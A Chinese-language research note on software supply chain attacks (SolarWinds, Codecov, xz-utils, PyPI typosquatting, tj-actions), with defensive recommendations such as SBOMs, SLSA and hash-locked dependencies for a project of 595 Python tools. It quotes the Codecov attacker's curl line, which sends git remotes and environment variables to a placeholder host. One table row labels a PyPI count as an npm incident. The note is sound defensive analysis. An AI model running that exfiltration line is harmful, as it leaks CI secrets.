# 方向 89：软件供应链攻击

> 主题：攻击者通过污染依赖 / 构建链 / 包管理器（typosquatting、恶意 npm/pip 包、SolarWinds 式、CI/CD 投毒）危害项目；阙疑用 595 个 .py 工具与众多依赖，如何被审计与防护；防御（锁定依赖哈希、SBOM、最小化依赖、构建可重现）。交叉方向：23（依赖锁定）、28（git 历史）、29（仓库管理）。

---

## 核心结论

1. **软件供应链攻击已从"边缘风险"变为"高频确定性威胁"，且投毒点正从"包名"上移到"构建/维护者信任"本身。** 2024 年的 xz-utils 后门（CVE-2024-3094，CVSS 10.0）证明：攻击者可以先用约两年时间以可信维护者身份渗透开源项目、取得发布权，再把后门只植入**发布压缩包而非公开 Git 仓库**，从而骗过绝大多数代码审计。对阙疑而言，这直接削弱了其"判决可复算 + 证据可追"卖点的前提——如果承载 595 个 .py 工具与 `gate_engine.py`（3826 行）的 Python 环境本身被投毒，复算结果的可信度归零。

2. **规模化包生态投毒已成常态，单次事件可波及数万仓库。** GitHub Advisory 数据库确认 2025-03 的 `tj-actions/changed-files` CI/CD 投毒"impacting over 23,000 repositories"；奇安信 2024-03 监测到 PyPI 一次性出现 **582 个**仿冒流行包的恶意包；2023-03 PyPI 单月被录入 **450+** 个恶意包。阙疑的 595 个工具由 LLM 辅助批量生成（`_arch_v46/` 有 75+ 份 AI 文档 + 595 个 .py 工具），其 `pip install` 来源若未经哈希锁定，正是这类攻击的高危入口。

3. **可工程化的防御三件套（依赖哈希锁定 + SBOM + 可重现构建）已被 NIST/EO 14028、SLSA、OpenSSF 标准化，且可与阙疑既有的 append-only 哈希链账本与"独立对账器"机制直接复用。** 美国行政令 14028（2021-05-12）已把 SBOM 列为联邦采购的合规要求，NTIA 最小元素明确接受 SPDX / CycloneDX / SWID 三种机器可读格式；SLSA 框架给出从源码到制品的四级完整性保证。阙疑不必从零造轮子——把每个 .py 工具与其依赖哈希写进现有 Merkle checkpoint 账本，即可把"供应链完整性"变成可第三方复算的证据，反而强化论文 E&D 卖点。

## 精确数字与案例

### 一、构建链 / 包管理器投毒：四起标志性事件（含构建系统被攻陷）

下表汇总四起"污染发生在依赖或构建环节"的经典案例，均为公开、可核验的权威来源：

| 事件 | 年份 | 投毒环节 | 关键数字 | 发现者 / 来源 |
|---|---|---|---|---|
| SolarWinds Orion（SUNBURST） | 2020 | 入侵 SolarWinds 构建系统，木马化更新 | **约 18,000** 政府/企业用户下载了被篡改版本 | FireEye，2020-12-13 首次公开 |
| Codecov Bash Uploader | 2021 | 篡改 CI 中 `curl|bash` 执行的脚本 | 2021-01-31 起 **108 个时间窗口**被篡改 | Codecov 官方安全更新，2021-04-01 |
| event-stream（flatmap-stream） | 2018 | 原维护者移交权限后被恶意接管 | 影响约 **2000 万次**下载（腾讯云预警） | 社区披露，2018-11 |
| colors.js / faker.js | 2022 | 维护者主动植入"抗议软件" | 数万个依赖项目的构建崩溃 | Marak Squires，Sonatype 2022-01-10 |

SolarWinds 的逐字事实（维基百科 "2020 United States federal government data breach"）：

> "SolarWinds said that of its 300,000 customers, 33,000 use Orion. **Of these, around 18,000 government and private users downloaded compromised versions.**"

> "FireEye named the malware **SUNBURST**." … "If a user installed the update, this would execute the malware payload, which would **stay dormant for 12–14 days before attempting to communicate with one or more of several command-and-control servers**."

Codecov 官方安全更新的逐字时间线与篡改片段：

> "Our investigation has determined that beginning **January 31, 2021**, there were periodic, unauthorized alterations of our Bash Uploader script by a third party, which enabled them to potentially export information stored in our users' continuous integration (CI) environments."

> "The modified portion of the bash uploader script was as follows – `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://IPADDRESS/upload/v2 || true`"

> "**Between Jan 31 and Apr 1, there were 108 windows of time** while the malicious Bash Uploader was affected."

这起事件对阙疑的启示极强：它证明"危害不一定来自被发布的软件本身"，而是来自开发者在 CI 里随手执行的 `curl|bash` 一行脚本——阙疑若在任何复现脚本、README 或 Dockerfile 中引用了外部 `curl|bash` 安装器，就是同构风险面。

### 二、2024 xz-utils 后门（CVE-2024-3094）：已知最精密的供应链攻击

这是研究软件供应链必须单列的案例。腾讯云开发者社区对 CVE-2024-3094 的逐字属性表：

> "CVE-2024-3094 是一个存在于 XZ Utils 数据压缩库中的关键供应链后门漏洞，**CVSS v3.1 评分为 10.0（严重）**。该漏洞通过修改构建过程在 liblzma 库中植入了远程代码执行后门。"

| 属性 | 值 |
|---|---|
| CVE ID | CVE-2024-3094 |
| CVSS | **10.0（严重）** |
| 受影响版本 | **5.6.0 和 5.6.1** |
| 发现日期 | 2024-03-29 |
| 发现者 | **Andres Freund**（Microsoft / PostgreSQL 开发者） |
| 漏洞类型 | 供应链攻击 / 嵌入式恶意代码（CWE-506） |
| 攻击向量 | 修改构建过程注入 RCE 后门 |

其技术要点（逐字摘录）：

> "恶意代码未出现在公共 Git 仓库，仅存在于发布压缩包中"；"以'测试文件'形式包含预构建的对象文件"；"在编译过程中将恶意逻辑注入到 liblzma 库"。

> "攻击路径：sshd (使用 systemd) → libsystemd.so → liblzma.so（被注入）"。

这正是方向 28（git 历史）要警惕的镜像问题：**公开 Git 仓库"看上去干净"，不等于发布的构建产物干净**。xz 后门只在 tarball 里、不在 git 里，所以单纯 `git log` 审计抓不到。学术界对此已有系统分析，如 arXiv 论文 *"Wolves in the Repository: A Software Engineering Analysis of the XZ Utils Backdoor"*（arXiv:2504.17473，2025），从软件工程角度拆解攻击者如何用"社会工程 + 长期渗透"取得维护权。关于攻击者化名"Jia Tan / JiaT75"为公开报道中使用的维护者别名（多家媒体与 arXiv 论文提及），具体身份归属属执法调查范畴，**未独立核实为真实自然人**，列为盲区。

### 三、包生态规模化投毒：Typosquatting 与依赖混淆（单次数百包、数万仓库）

| 事件 | 年份 | 规模数字 | 来源 |
|---|---|---|---|
| PyPI 仿冒包浪潮 | 2023-03 | **450+** 个恶意包（Phylum/Check Point/ReversingLabs 录入），约 15 个/天 | Safeguard.sh "The March 2023 PyPI Malware Wave" |
| PyPI 伪造包名攻击 | 2024-03-26 | **582 个**恶意包（仿冒 colorama/pillow/requests 等，版本号均 1.0.0） | 奇安信天问，research.qianxin.com |
| npm 双波次投毒 | 2024-03 | **500+** 个 PyPI 包（Check Point，瞄准 cryptography 等） | Check Point（经 Grokipedia 综述） |
| 依赖混淆（Dependency Confusion） | 2021 | 在 Apple、Microsoft、Tesla、PayPal 等内网触发 RCE | Alex Birsan 自述博客（2021-02） |
| tj-actions/changed-files CI/CD 投毒 | 2025-03 | **over 23,000 repositories** 受影响，CVE-2025-30066，CVSS 8.6 | GitHub Advisory GHSA-mrrh-fwg8-r2c3 |

依赖混淆（Alex Birsan, 2021）的机制：企业内部私有包名未被公共 registry 占用，攻击者在 npm/PyPI/RubyGems 上以同名发布恶意包，包管理器按"公共源优先/先到先得"解析，于是把恶意代码拉进企业构建。Birsan 自述因此获得 **超过 13 万美元**的漏洞奖励（具体数额为其个人博客披露，**未独立核实精确金额**）。

2025-03 的 tj-actions 事件尤其值得阙疑警惕，因为它攻击的是 **CI/CD 本身**，而非应用依赖。GitHub Advisory 逐字描述：

> "A supply chain attack compromised the **tj-actions/changed-files** GitHub Action, **impacting over 23,000 repositories**. Attackers retroactively modified multiple version tags to reference a malicious commit, exposing CI/CD secrets in workflow logs."

> "The attack involved modifying the **tj-actions/changed-files** GitHub Action to execute a malicious Python script. This script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs."

其 IOC 之一是把 tag 重指向恶意 commit `0e58ed8671d6b60d0890c21b07f8835ace038e67`，并 `curl` 外部 gist 下载内存dump脚本——这与"用 tag 而非 commit SHA 固定依赖"的坏习惯直接相关，恰好呼应方向 23（依赖锁定）与方向 25（CI/CD 最小配置）。

### 四、防御体系：SBOM / SLSA / 依赖哈希锁定 / 可重现构建

**SBOM（软件物料清单）** 已被美国行政令 14028（2021-05-12）制度化。NIST 页面逐字定义：

> "Section 10(j) of EO 14028 defines an SBOM as a 'formal record containing the details and supply chain relationships of various components used in building software,' similar to food ingredient labels on packaging."

NTIA 最小元素要求的数据字段包括：供应商名、组件名、版本、唯一标识符、依赖关系、SBOM 作者、时间戳；**机器可读格式目前接受 SPDX、CycloneDX、SWID 三种**（NIST 原文）。中国方面，国家工业信息安全发展研究中心（国家工信安全中心）已于 2024-10-24 发布《软件物料清单构成和要求》社区版标准（来源：sbom.openatom.tech），并配套 OpenSCA 等 SCA 工具，说明 SBOM 已是国内外共识性基础防御。

**SLSA（Supply-chain Levels for Software Artifacts，发音 "salsa"）** 由 OpenSSF 主导，官网定义：

> "Supply-chain Levels for Software Artifacts, or SLSA ('salsa'). It's a security framework, a checklist of standards and controls to prevent tampering, improve integrity, and secure packages and infrastructure."

SLSA 把保证等级分为 4 级（从基础防篡改到抗高级威胁），覆盖源码、构建、依赖三处。对阙疑而言，SLSA 的"构建产出须带来源证明（provenance）"恰可与项目既有的 **Merkle checkpoint / 不依赖内核的独立对账器** 对齐：把每个 .py 工具的构建 provenance 写进哈希链，第三方即可不信任内核地复算"这个工具确实由这些依赖、在这个环境中构建"。

**可重现构建（Reproducible Builds）** 由 Debian 等项目长期推动，目标是"bit-for-bit 完全相同的重建"。Debian 的 reproduce.debian.net 服务尝试对发行版内每个二进制包做逐位重建验证。具体当前可重现百分比随套件每日变动，**未核实精确数字**（见盲区），但其方法论（保留 `.buildinfo`、记录构建环境、可第三方重算）与阙疑"判决可复算"的核心卖点同构，是天然可借力的叙事。

**依赖哈希锁定** 是最低成本的单点防御：用 `pip-compile --generate-hashes`（Poetry/`uv` 同理）生成带 **SHA256 哈希** 的 lockfile，使 `pip install` 时若依赖内容被替换为恶意版本会立即因哈希不匹配而失败。这正是方向 23 的主题，也是阻断 typosquatting / 依赖混淆 / 后门重打包的第一道闸门。

## 对阙疑的 3 条具体行动

1. **为 595 个 .py 工具生成 CycloneDX SBOM 并落地依赖哈希锁定（呼应方向 23 / 29）。** 在 `C:/CodeLearnling/note/note/C++/CPP-Bible/_arch_v47/` 下新建 `sbom/` 与 `lock/` 子目录，用 `pip-compile --generate-hashes pyproject.toml > lock/requirements.lock` 锁定全部直接+传递依赖的 SHA256，再用 `cdxgen -o sbom/queyi.cdx.json` 生成 CycloneDX 格式 SBOM；同时用 `pip-audit -r lock/requirements.lock` 跑已知漏洞扫描，把结果写入 `sbom/audit-<日期>.txt`。**时间点：2027-05（投稿前）前完成首版，并纳入 CI 复跑。** 这直接回应 227 项工作树漂移——用 lockfile 把"实际环境"和"声明环境"对齐。

2. **把 595 个工具本身的完整性纳入 append-only 哈希链账本（呼应方向 28 / 64 Merkle 校验）。** 在现有 Merkle checkpoint 机制中新增一个 `tools_manifest` 字段：对 595 个 .py 工具每个计算内容哈希（SHA256）+ 记录其所属目录、最后修改 commit、声明依赖清单，并打进 Merkle checkpoint。这样任何工具被静默替换（类 xz 的"发布物≠仓库"问题）都会被对账器检出。**具体文件：`gate_engine.py` 增加 `emit_tools_manifest()` 函数；账本新增 `kind=tool_integrity` 记录；时间点 2027-03 前。** 同时清理本机 `curl|bash` 式安装残留（见方向 24 环境变量），杜绝 Codecov 式 CI 投毒入口。

3. **若项目使用任何 GitHub Actions / 外部 CI 步骤，一律改用 commit SHA 固定并加 SLSA provenance（呼应方向 25 CI/CD 最小配置）。** 在 `.github/workflows/` 中把所有 `uses: owner/repo@v1` 改为 `uses: owner/repo@<40位commit SHA>`，并启用 `step-security/harden-runner` 做异常外联检测（tj-actions 事件正是靠它发现 `gist.githubusercontent.com` 异常外联）。若暂未用 CI，则在 `REPLICATION.md`（方向 26）显式声明："本项目构建不依赖任何 `curl|bash` 外部安装器；所有依赖经 lockfile 哈希校验"，把"无供应链投毒面"作为复现性声明的一部分写进论文。

## 盲区（诚实标注）

- **xz-utils 攻击者真实身份**：公开报道使用化名 "Jia Tan / JiaT75"，但具体自然人身份与司法结论属执法调查范畴，本文未独立核实，仅作为"长期社会工程渗透取得维护权"的案例引用，不对其身份做断言。
- **Debian 可重现构建的当前精确百分比**：reproduce.debian.net / tests.reproducible-builds.org 数据每日变动，本文未抓取当日精确数值（如 amd64 testing 的可重现率），仅引用其方法论；如需在论文中引用具体百分比，须现场抓取并标注日期。
- **Alex Birsan 依赖混淆漏洞奖励金额**：多家报道称"超过 13 万美元"，但精确数额来自 Birsan 个人博客（2021-02），本文未直接打开核实，建议引用时回查原博客或后续学术综述（如软件供应链安全教材）。
- **奇安信 582 个恶意包与 Check Point 500+ 包的统计口径**：前者为天问平台单日监测值，后者为两波次合并估算，不同厂商计数口径不一；跨厂商数字不可直接相加，本文已分别标注来源，避免制造"总规模"错觉。
- **Codecov 实际受影响企业清单与泄露环境变量范围**：官方仅确认"存在受影响用户群"并邮件通知，未公开完整受害清单；本文未核实具体受害组织数量，仅引用其时间线与篡改片段。
- **国内 SBOM 标准《软件物料清单构成和要求》的具体强制力**：国家工信安全中心 2024-10-24 发布的是"社区版/标准"，其是否为强制国标、适用行业范围，本文未逐条核实法规层级，引用时建议区分"团体标准"与"强制国标"。
